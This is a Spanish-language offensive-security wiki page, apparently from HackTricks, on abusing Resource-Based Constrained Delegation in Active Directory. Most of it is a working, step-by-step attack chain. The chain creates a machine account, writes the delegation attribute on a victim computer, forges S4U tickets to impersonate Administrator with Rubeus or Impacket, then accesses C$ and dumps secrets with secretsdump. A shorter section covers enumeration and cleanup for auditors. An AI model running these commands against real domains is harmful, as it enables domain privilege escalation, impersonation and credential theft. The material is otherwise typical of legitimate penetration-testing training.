# Delegación Constrain Basada en Recursos

{{#include ../../banners/hacktricks-training.md}}


## Conceptos Básicos de la Delegación Constrain Basada en Recursos

Esto es similar a la [Delegación Constrain](constrained-delegation.md) básica pero **en lugar** de dar permisos a un **objeto** para **suplantar a cualquier usuario contra una máquina**. La Delegación Constrain Basada en Recursos **establece** en **el objeto quién puede suplantar a cualquier usuario contra él**.

En este caso, el objeto restringido tendrá un atributo llamado _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ con el nombre del usuario que puede suplantar a cualquier otro usuario contra él.

Otra diferencia importante de esta Delegación Constrain con respecto a las otras delegaciones es que cualquier usuario con **permisos de escritura sobre una cuenta de máquina** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) puede establecer el **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (En las otras formas de Delegación necesitabas privilegios de administrador de dominio).

### Nuevos Conceptos

En la Delegación Constrain se mencionó que la **`TrustedToAuthForDelegation`** bandera dentro del valor _userAccountControl_ del usuario es necesaria para realizar un **S4U2Self.** Pero eso no es completamente cierto.\
La realidad es que incluso sin ese valor, puedes realizar un **S4U2Self** contra cualquier usuario si eres un **servicio** (tienes un SPN) pero, si **tienes `TrustedToAuthForDelegation`** el TGS devuelto será **Forwardable** y si **no tienes** esa bandera el TGS devuelto **no será** **Forwardable**.

Sin embargo, si el **TGS** utilizado en **S4U2Proxy** **NO es Forwardable**, intentar abusar de una **delegación Constrain básica** **no funcionará**. Pero si estás tratando de explotar una **delegación Constrain basada en recursos, funcionará**.

### Estructura del Ataque

> Si tienes **privilegios equivalentes de escritura** sobre una cuenta de **Computadora**, puedes obtener **acceso privilegiado** en esa máquina.

Supongamos que el atacante ya tiene **privilegios equivalentes de escritura sobre la computadora víctima**.

1. El atacante **compromete** una cuenta que tiene un **SPN** o **crea uno** (“Servicio A”). Ten en cuenta que **cualquier** _Usuario Admin_ sin ningún otro privilegio especial puede **crear** hasta 10 objetos de Computadora (**_MachineAccountQuota_**) y establecerles un **SPN**. Así que el atacante puede simplemente crear un objeto de Computadora y establecer un SPN.
2. El atacante **abusa de su privilegio de ESCRITURA** sobre la computadora víctima (ServicioB) para configurar **delegación constrain basada en recursos para permitir que ServiceA supla a cualquier usuario** contra esa computadora víctima (ServicioB).
3. El atacante utiliza Rubeus para realizar un **ataque S4U completo** (S4U2Self y S4U2Proxy) desde el Servicio A al Servicio B para un usuario **con acceso privilegiado al Servicio B**.
1. S4U2Self (desde la cuenta SPN comprometida/creada): Pide un **TGS de Administrador para mí** (No Forwardable).
2. S4U2Proxy: Usa el **TGS no Forwardable** del paso anterior para pedir un **TGS** de **Administrador** al **host víctima**.
3. Incluso si estás usando un TGS no Forwardable, como estás explotando la delegación constrain basada en recursos, funcionará.
4. El atacante puede **pasar el ticket** y **suplantar** al usuario para obtener **acceso al ServicioB víctima**.

Para verificar el _**MachineAccountQuota**_ del dominio puedes usar:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Ataque

### Creando un Objeto de Computadora

Puedes crear un objeto de computadora dentro del dominio usando **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configuración de Delegación Constrainida Basada en Recursos

**Usando el módulo de PowerShell de activedirectory**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Usando powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Realizando un ataque S4U completo (Windows/Rubeus)

Primero que nada, creamos el nuevo objeto de Computadora con la contraseña `123456`, así que necesitamos el hash de esa contraseña:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Esto imprimirá los hashes RC4 y AES para esa cuenta.\
Ahora, se puede realizar el ataque:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Puedes generar más tickets para más servicios solo pidiendo una vez usando el parámetro `/altservice` de Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Tenga en cuenta que los usuarios tienen un atributo llamado "**No se puede delegar**". Si un usuario tiene este atributo en True, no podrá impersonarlo. Esta propiedad se puede ver dentro de bloodhound.

### Herramientas de Linux: RBCD de extremo a extremo con Impacket (2024+)

Si opera desde Linux, puede realizar toda la cadena RBCD utilizando las herramientas oficiales de Impacket:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notas
- Si se aplica la firma LDAP/LDAPS, use `impacket-rbcd -use-ldaps ...`.
- Prefiera claves AES; muchos dominios modernos restringen RC4. Impacket y Rubeus admiten flujos solo AES.
- Impacket puede reescribir el `sname` ("AnySPN") para algunas herramientas, pero obtenga el SPN correcto siempre que sea posible (por ejemplo, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Accediendo

La última línea de comando realizará el **ataque S4U completo e inyectará el TGS** desde Administrator al host víctima en **memoria**.\
En este ejemplo se solicitó un TGS para el servicio **CIFS** desde Administrator, por lo que podrá acceder a **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abusar de diferentes tickets de servicio

Aprenda sobre los [**tickets de servicio disponibles aquí**](silver-ticket.md#available-services).

## Enumeración, auditoría y limpieza

### Enumerar computadoras con RBCD configurado

PowerShell (decodificando el SD para resolver SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (leer o vaciar con un comando):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Limpieza / reinicio de RBCD

- PowerShell (limpiar el atributo):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Errores de Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Esto significa que kerberos está configurado para no usar DES o RC4 y solo estás proporcionando el hash RC4. Proporciona a Rubeus al menos el hash AES256 (o simplemente proporciónale los hashes rc4, aes128 y aes256). Ejemplo: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Esto significa que la hora de la computadora actual es diferente de la del DC y kerberos no está funcionando correctamente.
- **`preauth_failed`**: Esto significa que el nombre de usuario + hashes dados no están funcionando para iniciar sesión. Puede que hayas olvidado poner el "$" dentro del nombre de usuario al generar los hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Esto puede significar:
- El usuario que intentas suplantar no puede acceder al servicio deseado (porque no puedes suplantarlo o porque no tiene suficientes privilegios)
- El servicio solicitado no existe (si pides un ticket para winrm pero winrm no está en ejecución)
- La computadora falsa creada ha perdido sus privilegios sobre el servidor vulnerable y necesitas devolvérselos.
- Estás abusando del KCD clásico; recuerda que RBCD funciona con tickets S4U2Self no reenviables, mientras que KCD requiere que sean reenviables.

## Notas, relés y alternativas

- También puedes escribir el SD de RBCD sobre los Servicios Web de AD (ADWS) si LDAP está filtrado. Ver:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Las cadenas de relé de Kerberos frecuentemente terminan en RBCD para lograr SYSTEM local en un solo paso. Ver ejemplos prácticos de extremo a extremo:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Referencias

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (oficial): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Hoja de trucos rápida de Linux con sintaxis reciente: https://tldrbins.github.io/rbcd/


{{#include ../../banners/hacktricks-training.md}}
